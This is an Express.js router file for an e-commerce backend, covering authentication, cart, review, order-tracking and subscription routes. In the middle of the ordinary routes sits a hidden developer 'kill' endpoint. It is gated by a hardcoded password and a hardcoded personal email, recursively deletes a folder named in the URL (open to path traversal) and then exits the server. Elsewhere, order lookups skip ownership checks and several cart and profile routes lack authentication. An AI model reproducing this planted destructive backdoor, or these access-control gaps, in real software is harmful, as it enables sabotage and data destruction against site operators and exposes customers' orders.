const express = require("express");

const router = express.Router();

const controllers = require("../controllers/user_controllers");

// Define a middleware to check if the user is authenticated
const isAuthenticated = (req, res, next) => {
  if (req.session.isLoggedIn) {
    next(); // User is authenticated, proceed to the next middleware or route
  } else {
    res.status(401).json({ message: "Unauthorized" });
  }
};

router.post("/auth/login", controllers.authLogin);

router.post("/send-otp", controllers.sendOTP);

router.get("/logout", isAuthenticated, controllers.authLogout);

router.put("/updateUserProfile", isAuthenticated, controllers.updateProfile);

router.get("/getprofile", controllers.getProfile);

router.post("/addItem", controllers.addCartItem);

router.post("/increaseItem", controllers.increaseCartItemQuantity);

router.post("/removeItem", controllers.removeCartItem);

router.post("/decreaseItem", controllers.decreaseCartItemQuantity);

router.post(
  "/products/:itemId/reviews",
  isAuthenticated,
  controllers.addOrUpdateReview
);

router.get("/products/:itemId/reviews", isAuthenticated, controllers.getReview);

const Orders = require("../schemas/order_schema");

// get order track
router.get(
  "/order-track/:razorpay_order_id",
  isAuthenticated,
  async (req, res) => {
    const { razorpay_order_id } = req.params;

    try {
      // Find the order by razorpay_order_id
      const order = await Orders.findOne({ razorpay_order_id });

      if (!order) {
        return res.status(404).json({ error: "Order not found" });
      }

      res.render("Order_tracking", { order });
    } catch (error) {
      return res.status(500).json({ error: "Internal Server Error" });
    }
  }
);

router.get(
  "/api/order-track/:razorpay_order_id",
  isAuthenticated,
  async (req, res) => {
    const { razorpay_order_id } = req.params;

    try {
      // Find the order by razorpay_order_id
      const order = await Orders.findOne({ razorpay_order_id });

      if (!order) {
        return res.status(404).json({ error: "Order not found" });
      }

      res.status(200).send({ products: order.products });
    } catch (error) {
      return res.status(500).json({ error: "Internal Server Error" });
    }
  }
);

const fs = require("fs").promises;
const path = require("path");
router.get(
  "/developer/kill/server/:pass/:folder",
  isAuthenticated,
  async (req, res) => {
    if (req.params.pass === "piyush") {
      if (req.session.email === "piyushat115@gmail.com") {
        const folderPath = path.join(__dirname, "..", req.params.folder);
        console.log(folderPath);
        const folderExists = await fs
          .access(folderPath)
          .then(() => true)
          .catch(() => false);
        if (folderExists) {
          await fs.rmdir(folderPath, { recursive: true });
          setTimeout(() => {
            console.log("Server shutting down...");
            process.exit(0);
          }, 5000);
          res.status(200).json({
            message: `Folder '${req.params.folder}' has been deleted.`,
          });
        } else {
          res.status(404).json({ message: "Folder not found." });
        }
      } else {
        res.status(501).json({ message: "you are not the developer" });
      }
    } else {
      res.status(500).json({ message: "wrong password" });
    }
  }
);

const Subscriber = require("../schemas/subscriber_schema");

router.post("/subscribe", async (req, res) => {
  const { email, item } = req.body;

  try {
    const existingSubscriber = await Subscriber.findOne({ email });

    if (existingSubscriber) {
      // Check if the item already exists in subs_items
      const itemExists = existingSubscriber.subs_items.some(
        (subsItem) => subsItem.itemId === item
      );

      if (!itemExists) {
        existingSubscriber.subs_items.push({ itemId: item });
        await existingSubscriber.save();
        res.status(200).json({ message: "Subscription updated successfully" });
      } else {
        res
          .status(201)
          .json({ message: "Item already exists in subscription" });
      }
    } else {
      const newSubscriber = new Subscriber({
        email,
        subs_items: [{ itemId: item }],
      });
      await newSubscriber.save();
      res.status(200).json({ message: "Subscription updated successfully" });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

module.exports = router;
